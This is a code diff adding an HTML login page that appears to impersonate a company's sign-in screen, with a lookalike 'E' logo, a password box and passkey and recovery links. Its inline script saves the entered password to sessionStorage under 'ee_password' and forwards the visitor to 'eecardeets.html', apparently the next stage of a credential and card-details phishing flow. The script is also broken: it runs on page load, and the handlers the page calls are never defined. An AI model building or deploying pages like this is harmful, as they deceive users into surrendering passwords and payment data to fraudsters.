@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Secure Authentication</title>
+  <style>
+    * { box-sizing: border-box; margin:0; padding:0; }
+    body {
+      font-family: Arial, sans-serif;
+      background: #f6f6f6;
+      display:flex; justify-content:center; align-items:center;
+      height:100vh;
+    }
+    .card {
+      background: #fff;
+      border: 1px solid #ccc;
+      border-radius: 12px;
+      width: 360px;
+      padding: 40px 30px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+      text-align: center;
+    }
+    .logo {
+      position: relative;
+      width: 36px;
+      height: 72px;
+      margin: 0 auto 24px;
+    }
+    .logo div {
+      position: absolute;
+      left: 0;
+      width: 36px; height: 36px;
+      background: #005c67;
+      color: #fff;
+      border-radius: 50%;
+      line-height: 36px;
+      font-size: 18px;
+      text-align: center;
+    }
+    .logo .top { top: 0; z-index: 2; }
+    .logo .bottom { top: 36px; z-index: 1; }
+    h2 {
+      color: #005c67;
+      font-size: 22px;
+      text-align: left;
+      margin-bottom: 20px;
+    }
+    .user-info {
+      display:flex; align-items:center;
+      margin-bottom:20px;
+      text-align: left;
+    }
+    .user-info .avatar {
+      width:36px; height:36px;
+      background: #ddd;
+      border-radius:50%;
+      margin-right:12px;
+    }
+    .user-info .username {
+      font-size:16px; color:#111;
+    }
+    .user-info .change {
+      display:block;
+      font-size:13px;
+      color:#005c67;
+      text-decoration:none;
+    }
+    label {
+      display:block;
+      font-size:14px;
+      color:#333;
+      text-align:left;
+      margin-bottom:6px;
+    }
+    input[type="password"] {
+      width:100%; padding:12px;
+      font-size:16px; border-radius:6px;
+      border:1px solid #ccc;
+      margin-bottom:10px;
+    }
+    .show-password { display:flex; align-items:center; margin-bottom:20px; font-size:14px; }
+    .show-password input { margin-right:6px; }
+    button.primary {
+      width:100%; padding:14px;
+      background:#000; color:#fff;
+      border:none; border-radius:8px;
+      font-size:16px; cursor:pointer;
+    }
+    button.primary:hover { opacity:0.95; }
+    a.link {
+      display:block; font-size:13px;
+      color:#005c67; text-decoration:none;
+      margin-top:16px;
+    }
+    button.passkey {
+      margin-top:20px;
+      width:100%; padding:12px;
+      border:1.5px solid #000;
+      border-radius:8px; background:#fff;
+      font-size:16px; color:#000;
+      cursor:pointer;
+    }
+    .footer { margin-top:20px; font-size:14px; }
+    .footer a { display:block; font-size:13px; color:#005c67; text-decoration:none; margin-top:8px; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="logo">
+      <div class="top">E</div>
+      <div class="bottom">E</div>
+    </div>
+    <h2>Log in</h2>
+
+    <div class="user-info">
+      <div class="avatar"></div>
+      <div>
+        <div class="username" id="username-display"></div>
+        <a class="change" href="#">Change email or username</a>
+      </div>
+    </div>
+
+    <label for="password">Password</label>
+    <input type="password" id="password" placeholder="Enter your password">
+
+    <div class="show-password">
+      <input type="checkbox" id="togglePw" onchange="togglePw()">
+      <label for="togglePw">Show password</label>
+    </div>
+
+    <button class="primary" type="button" onclick="submitLogin()">Next</button>
+
+    <a class="link" href="#">Forgot password?</a>
+
+    <button class="passkey">Use a passkey instead</button>
+
+    <div class="footer">
+      <a href="#">Privacy Policy</a>
+      <a href="#">Terms of Use</a>
+    </div>
+  </div>
+  <script>
+      const password = document.getElementById('password').value.trim();
+      sessionStorage.setItem('ee_password', password);
+      window.location.href = 'eecardeets.html';
+  </script>
+</body>
+</html>
